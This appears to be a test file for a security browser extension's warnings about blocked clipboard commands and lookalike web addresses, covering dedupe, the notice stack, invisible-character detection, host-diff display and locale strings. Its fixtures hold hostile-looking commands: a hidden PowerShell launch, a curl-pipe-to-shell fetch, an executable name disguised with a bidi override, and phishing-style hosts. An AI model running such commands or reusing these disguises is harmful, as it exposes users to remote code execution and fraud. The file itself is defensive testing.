// Tests for the blocker notices' pure part (src/content/notice-model.ts):
// the uBO event detail, dedupe, the stack model, the command field
// (invisible characters, scroll state) and the lookalike host diff; plus the
// notice* locale keys used by src/content/notice.ts.
//
// Fixtures are assembled from pieces (x(...)) so the file holds no command
// line verbatim (antivirus engines flag such files).
//
// SPDX-FileCopyrightText: 2026 Bastion Security GmbH and contributors
// SPDX-License-Identifier: GPL-3.0-or-later

import { test } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import {
  charCount,
  clipKey,
  clipSlot,
  Deduper,
  DEDUPE_MS,
  hostDiff,
  MAX_CLIP_NOTICES,
  MAX_NOTICE_TEXT,
  MAX_NOTICES,
  overflow,
  parseUboDetail,
  scrollState,
  splitInvisible,
  stackView,
  truncateParts,
} from '../../src/content/notice-model.ts';
import type { HostPart } from '../../src/content/notice-model.ts';

const x = (...parts: string[]) => parts.join('');
const HIGH = x('power', 'shell -w hid', 'den -c "Write-Output test"');
const MEDIUM = x('curl -fsSL https://example.invalid/i.sh | ', 'sh');

test('uBO event detail: only "ubo|<text>" with non-blank text, capped', () => {
  assert.equal(parseUboDetail('ubo|hello'), 'hello');
  assert.equal(parseUboDetail('ubo|  '), null);
  assert.equal(parseUboDetail('ubo|'), null);
  assert.equal(parseUboDetail('c|writeText|0|x'), null);
  assert.equal(parseUboDetail(null), null);
  assert.equal(parseUboDetail({ text: 'x' }), null);
  assert.equal(parseUboDetail('ubo|' + 'a'.repeat(MAX_NOTICE_TEXT + 50))?.length, MAX_NOTICE_TEXT);
});

test('identical text within the dedupe window gives one notice, from either source', () => {
  const d = new Deduper();
  const t0 = 1_000_000;
  assert.equal(d.seen(clipKey(MEDIUM), t0), false);
  assert.equal(d.seen(clipKey(`  ${MEDIUM}\n`), t0 + 500), true, 'whitespace differences do not matter');
  assert.equal(d.seen(clipKey(HIGH), t0 + 600), false, 'other text');
  assert.equal(d.seen(clipKey(MEDIUM), t0 + DEDUPE_MS + 1), false, 'after the window');
});

test('the stack keeps every notice of a page (30 ClickFix + 1 lookalike), the oldest goes beyond', () => {
  assert.equal(MAX_NOTICES, MAX_CLIP_NOTICES + 1);
  assert.equal(overflow(0), 0);
  assert.equal(overflow(MAX_NOTICES - 1), 0);
  assert.equal(overflow(MAX_NOTICES), 1);
});

test('stack view: newest on top, older ones behind one row that expands them', () => {
  assert.deepEqual(stackView([], false), { visible: 0, more: 0, clips: 0, addresses: 0, expandable: false });
  assert.deepEqual(stackView(['clip'], false), { visible: 1, more: 0, clips: 0, addresses: 0, expandable: false });
  assert.deepEqual(stackView(['clip'], true), { visible: 1, more: 0, clips: 0, addresses: 0, expandable: false });
  // N05: three notices -> one card and «2 weitere Meldungen» (1 Befehl - 1 Adresse).
  assert.deepEqual(stackView(['clip', 'clip', 'lookalike'], false), { visible: 1, more: 2, clips: 1, addresses: 1, expandable: true });
  assert.deepEqual(stackView(['clip', 'clip', 'lookalike'], true), { visible: 3, more: 2, clips: 1, addresses: 1, expandable: true });
  assert.deepEqual(stackView(['lookalike', 'clip'], false), { visible: 1, more: 1, clips: 1, addresses: 0, expandable: true });
});

test('past MAX_CLIP_NOTICES a blocked command is only counted in the row', () => {
  assert.equal(clipSlot(0), 'card');
  assert.equal(clipSlot(MAX_CLIP_NOTICES - 1), 'card');
  assert.equal(clipSlot(MAX_CLIP_NOTICES), 'count');
  assert.equal(clipSlot(MAX_CLIP_NOTICES + 5), 'count');
  // 32 commands: 30 cards, 2 counted -> «31 weitere Meldungen», «31 Befehle»; expanding shows the 30 cards.
  const kinds = new Array<'clip'>(MAX_CLIP_NOTICES).fill('clip');
  assert.deepEqual(stackView(kinds, false, 2), { visible: 1, more: 31, clips: 31, addresses: 0, expandable: true });
  assert.deepEqual(stackView(kinds, true, 2), { visible: MAX_CLIP_NOTICES, more: 31, clips: 31, addresses: 0, expandable: true });
  // A single card plus counted blocks: the row appears even without older cards, but cannot expand.
  assert.deepEqual(stackView(['clip'], false, 1), { visible: 1, more: 1, clips: 1, addresses: 0, expandable: false });
  // Every card closed, blocking goes on: the row stands alone.
  assert.deepEqual(stackView([], false, 3), { visible: 0, more: 3, clips: 3, addresses: 0, expandable: false });
});

test('invisible and bidi characters become chips with their code point, counted once each', () => {
  const s = splitInvisible(x('cmd /c start "" "Rechnung', '‮', 'fdp.exe"'));
  assert.equal(s.hidden, 1);
  assert.deepEqual(s.parts, [
    { text: 'cmd /c start "" "Rechnung', hidden: false },
    { text: 'U+202E', hidden: true },
    { text: 'fdp.exe"', hidden: false },
  ]);
  const z = splitInvisible('a​​b⁦');
  assert.equal(z.hidden, 3);
  assert.deepEqual(
    z.parts.map((p) => p.text),
    ['a', 'U+200B', 'U+200B', 'b', 'U+2066'],
  );
  // A page cannot fake a chip with the marker text itself.
  assert.equal(splitInvisible('⟨U+202E⟩').hidden, 0);
  assert.deepEqual(splitInvisible('plain'), { parts: [{ text: 'plain', hidden: false }], hidden: 0 });
  assert.deepEqual(splitInvisible(''), { parts: [], hidden: 0 });
});

test('character count counts code points; scroll state drives fade and count', () => {
  assert.equal(charCount('abc'), 3);
  assert.equal(charCount('a\u{1F600}b'), 3);
  assert.deepEqual(scrollState(100, 100, 0), { scrolls: false, atEnd: true }, 'fits: no fade, no count');
  assert.deepEqual(scrollState(101, 100, 0), { scrolls: false, atEnd: true }, 'sub-pixel rounding');
  assert.deepEqual(scrollState(300, 126, 0), { scrolls: true, atEnd: false });
  assert.deepEqual(scrollState(300, 126, 100), { scrolls: true, atEnd: false });
  assert.deepEqual(scrollState(300, 126, 174), { scrolls: true, atEnd: true }, 'at the bottom the fade goes');
});

const show = (parts: readonly (HostPart | 'ellipsis')[]) => parts.map((p) => (p === 'ellipsis' ? '…' : p.diff ? `[${p.text}]` : p.text)).join('');

test('lookalike diff boxes the differing characters of the visited host', () => {
  // N06: «rn» reads as «m», «-login» is inserted.
  assert.equal(show(hostDiff('rnicrosoft-login.com', 'microsoft.com')), '[rn]icrosoft[-login].com');
  assert.equal(show(hostDiff('www.paypa1.com', 'paypal.com')), 'www.paypa[1].com', 'leading labels are not a difference');
  assert.equal(show(hostDiff('arnazon.com', 'amazon.com')), 'a[rn]azon.com');
  assert.equal(show(hostDiff('paypal-login-secure.com', 'paypal.com')), 'paypal[-login-secure].com');
  assert.equal(show(hostDiff('www.secure-paypal.com', 'paypal.com')), 'www.[secure-]paypal.com');
  assert.equal(show(hostDiff('googgle.com', 'google.com')), 'goog[g]le.com');
  assert.equal(show(hostDiff('twlnt.ch', 'twint.ch')), 'tw[l]nt.ch');
  // A missing character marks its neighbour, so every difference shows.
  assert.ok(hostDiff('gogle.com', 'google.com').some((p) => p.diff));
  assert.ok(hostDiff('amazon.co', 'amazon.com').some((p) => p.diff));
  // Other TLD: the tail after the match is free (N07) ...
  assert.equal(
    show(hostDiff('p0stfinance.ch-secure-login-kundencenter-verify-account.top', 'postfinance.ch')),
    'p[0]stfinance.ch-secure-login-kundencenter-verify-account.top',
  );
  // ... unless nothing else differs: then the tail is the difference.
  assert.equal(show(hostDiff('paypal.com.evil.net', 'paypal.com')), 'paypal.com[.evil.net]');
  // The text is kept exactly (case included); only flags are added.
  const host = 'Login.PayPa1.com';
  assert.equal(hostDiff(host, 'paypal.com').map((p) => p.text).join(''), host);
  assert.deepEqual(hostDiff('', 'paypal.com'), []);
});

test('long hosts are cut in the middle with the diff boxes kept on the visible parts', () => {
  const long = 'p0stfinance.ch-secure-login-kundencenter-verify-account.top';
  const r = truncateParts(hostDiff(long, 'postfinance.ch'), 23);
  assert.equal(r.truncated, true);
  assert.equal(show(r.parts), 'p[0]stfinance…account.top');
  const short = truncateParts(hostDiff('rnicrosoft-login.com', 'microsoft.com'), 23);
  assert.equal(short.truncated, false);
  assert.equal(show(short.parts), '[rn]icrosoft[-login].com');
  // A box that straddles the cut is split, never lost on the visible side.
  const cut = truncateParts(
    [
      { text: 'aaaaaaaaaa', diff: false },
      { text: 'bbbbbbbbbbbbbbbbbbbb', diff: true },
      { text: 'cc', diff: false },
    ],
    12,
  );
  assert.equal(show(cut.parts), 'aaaaaa…[bbb]cc');
});

test('notice locale keys exist in every language, Swiss spelling in German, none unused, all with fallbacks', () => {
  const load = (lang: string) =>
    JSON.parse(readFileSync(new URL(`../../src/_locales/${lang}/messages.json`, import.meta.url), 'utf8')) as Record<string, { message: string; placeholders?: object }>;
  const de = load('de');
  const keys = Object.keys(de).filter((k) => k.startsWith('notice'));
  assert.ok(keys.length >= 20);
  for (const k of keys) assert.ok(!de[k]!.message.includes('ß'), `${k}: no sharp s in de-CH`);
  for (const lang of ['de', 'en', 'fr', 'it']) {
    const other = load(lang);
    assert.deepEqual(Object.keys(other).filter((k) => k.startsWith('notice')).sort(), [...keys].sort(), `${lang}: same notice keys`);
    for (const k of keys) {
      assert.deepEqual(Object.keys(other[k]!.placeholders ?? {}), Object.keys(de[k]!.placeholders ?? {}), `${lang}: ${k} placeholders`);
      assert.ok(!other[k]!.message.includes('·'), `${lang}: ${k} has no middle dot`);
      assert.ok(!other[k]!.message.includes('...'), `${lang}: ${k} uses the ellipsis character`);
    }
  }
  const src = readFileSync(new URL('../../src/content/notice.ts', import.meta.url), 'utf8');
  const start = src.indexOf('const FALLBACK');
  const fallback = src.slice(start, src.indexOf('};', start));
  for (const k of keys) {
    assert.ok(src.includes(`'${k}'`), `unused ${k}`);
    assert.ok(fallback.includes(`${k}:`), `no English fallback for ${k}`);
  }
  for (const m of src.matchAll(/'(notice[A-Z][A-Za-z]*)'/g)) assert.ok(de[m[1]!], `missing ${m[1]}`);
  assert.ok(!src.includes('·'), 'no middle dot in notice.ts');
  // Copy from the Paper sheet «A - Piktogramm-Karte».
  assert.equal(de.noticeClipTitle!.message, 'Gefährlicher Befehl gestoppt');
  assert.equal(de.noticeShowCommand!.message, 'Befehl ansehen');
  assert.equal(de.noticeCopyHint!.message, 'Nur kopieren, wenn Sie ihn verstehen.');
  // No override button: the notice only lets people read (and copy by hand).
  for (const lang of ['de', 'en', 'fr', 'it']) assert.ok(!Object.keys(load(lang)).includes('noticeClipCopyAnyway'), `${lang}: no copy-anyway string`);
});
